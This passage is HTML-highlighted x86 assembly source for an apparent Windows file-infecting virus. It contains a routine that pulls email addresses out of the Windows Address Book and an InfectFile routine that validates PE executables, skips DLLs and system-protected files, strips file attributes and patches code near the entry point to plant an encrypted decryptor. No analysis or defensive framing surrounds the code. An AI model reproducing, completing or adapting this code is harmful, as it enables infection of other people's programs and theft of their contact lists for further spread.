    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hWabMapBase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NumberOfMailAddresses</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;goto start of emails</span><span class="sc0">
</span><span class="sc5">NxtMail</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">44h</span><span class="sc0">
</span><span class="sc5">CpyMail</span><span class="sc4">:</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">MovNext</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">CpyMail</span><span class="sc0">
</span><span class="sc5">MovNext</span><span class="sc4">:</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">NxtMail</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hWabMapBase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">UnMapViewOfFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hWabMap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hWabFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CloseWABkeyAndExit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hkey</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">WabScanErr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
    
    </span><span class="sc5">WAB_Location</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Software\Microsoft\WAB\WAB4\Wab File Name"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">WAB_Path</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0ffh</span><span class="sc0">    </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">SizeOfWAB_PATH</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0ffh</span><span class="sc0">
    </span><span class="sc5">hWabFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">hWabMap</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">hWabMapBase</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">hMailAddresses</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">NumberOfMailAddresses</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    
    
    
    
</span><span class="sc5">ExecuteFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cb</span><span class="sc4">],</span><span class="sc5">SizeOfStartupinfo</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Startupinfo</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetStartupInfo</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Process_Information</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Startupinfo</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileDirectory</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CommandLine</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileToInfect</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CreateProcess</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc5">Process_Information</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">hprocess</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">hthread</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">dwprocessid</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">dwthreadid</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    
</span><span class="sc5">Startupinfo</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">cb</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">lpReserved</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">lpDesktop</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">lpTitle</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">dwX</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">dwY</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">dwXSize</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">dwYSize</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">dwXCountChars</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">dwYCountChars</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">dwFillAttribute</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">dwFlags</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wShowWindow</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">cbReserved2</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">lpReserved2</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">hStdInput</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">hStdOutput</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">hStdError</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">SizeOfStartupinfo</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">Startupinfo</span><span class="sc0">

    
</span><span class="sc5">InfectFile</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;*********************Debug C0de*******************************</span><span class="sc0">
</span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MB_YESNO</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">warning</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileToInfect</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessageBox</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IDYES</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ExitInfect</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
</span><span class="sc1">;**************************************************************</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckFileName</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ExitInfect</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckSFPFile</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ExitInfect</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RemoveFileAttributes</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenFile</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ExitInfect</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapbase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"ZM"</span><span class="sc0">     </span><span class="sc1">;check mz sign</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ExitWithoutInfection</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"EP"</span><span class="sc0">     </span><span class="sc1">;check pe sign</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ExitWithoutInfection</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;save pe header offset in the stack</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get flags</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2000h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2000h</span><span class="sc0">            </span><span class="sc1">;is dll ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nodll</span><span class="sc0">               </span><span class="sc1">;infect only executeables</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;restore stack</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitWithoutInfection</span><span class="sc0">
</span><span class="sc5">nodll</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;get image base</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ProgramImageBase</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">;save image base</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">6h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get number of sections</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc0">             </span><span class="sc1">;goto first section header</span><span class="sc0">
</span><span class="sc5">@nexts</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;get section flags</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">             </span><span class="sc1">;is code section ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">FoundCS</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@nexts</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;restore stack</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitWithoutInfection</span><span class="sc0">    
</span><span class="sc5">FoundCS</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;get section size of raw data</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0beh</span><span class="sc0">            </span><span class="sc1">;check for minimum decryptor size</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">____1</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;restore stack</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitWithoutInfection</span><span class="sc0">
</span><span class="sc5">____1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;get section vitrual size   </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;get section virtual size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;add to it pointer raw data rva</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapbase</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;convert it to va</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WhereToWriteDecryptor</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">;set where to write decryptor</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get pe header</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;save pointer to code section header</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;save size of code section</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;get entry point rva</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapbase</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;convert it to va</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc0">             </span><span class="sc1">;100 bytes</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ScanAndPatch</span><span class="sc0">            </span><span class="sc1">;try to patch instruction that close to EP first    </span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">patch2</span><span class="sc0">              </span><span class="sc1">;if fail try some other thing...</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8h</span><span class="sc0">              </span><span class="sc1">;restore stack</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">____2</span><span class="sc0">
</span><span class="sc5">patch2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc0">             </span><span class="sc1">;100 bytes</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;get pe header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;get program entry point rva</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapbase</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;convert it to va</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0c00h</span><span class="sc0">           </span><span class="sc1">;it work with some programs :)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ScanAndPatch</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">all_sec</span><span class="sc0">             </span><span class="sc1">;if we fail scan all code section</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8h</span><span class="sc0">              </span><span class="sc1">;restore stack</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">____2</span><span class="sc0">
</span><span class="sc5">all_sec</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;restore size of code section</span><span class="sc0">
